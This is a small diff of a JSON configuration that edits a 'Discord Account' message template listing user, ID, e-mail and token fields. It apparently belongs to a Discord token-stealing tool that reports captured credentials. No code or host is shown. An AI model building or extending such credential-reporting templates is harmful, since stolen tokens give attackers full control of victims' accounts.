@@ -13,7 +13,7 @@
         "ErrorColor": "#e94949",
         "SuccessColor": "#49e959",
         "MessageTitle": "Discord Account | {1}",
-        "MessageBody": "AT: {1}\\nUser: {2}\\nID: {3}\\nE-Mail: {4}{spoiler}\\nToken: {5}",
+        "MessageBody": "AT: {1}\\nUser: {2}\\nID: {3}\\nE-Mail: {4}\\nToken: {5}",
         "ErrorImageURL": "",
         "SuccessImageURL": "{1}"
     }
